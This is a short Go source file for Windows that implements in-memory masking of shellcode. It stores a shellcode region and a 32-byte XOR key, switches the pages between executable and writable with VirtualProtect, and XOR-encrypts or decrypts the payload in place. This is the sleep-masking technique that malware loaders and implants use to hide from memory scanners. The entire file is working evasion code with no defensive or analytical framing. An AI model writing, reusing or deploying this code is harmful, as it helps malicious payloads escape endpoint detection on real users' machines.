//go:build windows && amd64

package main

import (
	"sync"
	"unsafe"

	"golang.org/x/sys/windows"
)

var (
	maskBase uintptr
	maskSize uintptr
	maskKey  [32]byte
	maskMu   sync.Mutex
	masked   bool
)

// initMask stores the shellcode region and XOR key used by all masking operations.
func initMask(base, size uintptr, key [32]byte) {
	maskBase = base
	maskSize = size
	maskKey = key
}

// encryptMemory XOR-encrypts the shellcode in place.
//
// Call sequence: VirtualProtect(RX→RW) → XOR → VirtualProtect(RW→RX)
// The mu lock ensures only one goroutine encrypts/decrypts at a time.
func encryptMemory() {
	maskMu.Lock()
	defer maskMu.Unlock()
	if masked {
		return
	}
	toggleMask()
	masked = true
}

// decryptMemory XOR-decrypts the shellcode in place (XOR is its own inverse).
func decryptMemory() {
	maskMu.Lock()
	defer maskMu.Unlock()
	if !masked {
		return
	}
	toggleMask()
	masked = false
}

// toggleMask changes protection to RW, XORs all bytes, restores RX.
func toggleMask() {
	var old uint32
	_ = windows.VirtualProtect(unsafe.Pointer(maskBase), maskSize, windows.PAGE_READWRITE, &old)

	data := unsafe.Slice((*byte)(unsafe.Pointer(maskBase)), maskSize)
	for i, b := range data {
		data[i] = b ^ maskKey[i%32]
	}

	_ = windows.VirtualProtect(unsafe.Pointer(maskBase), maskSize, windows.PAGE_EXECUTE_READ, &old)
}
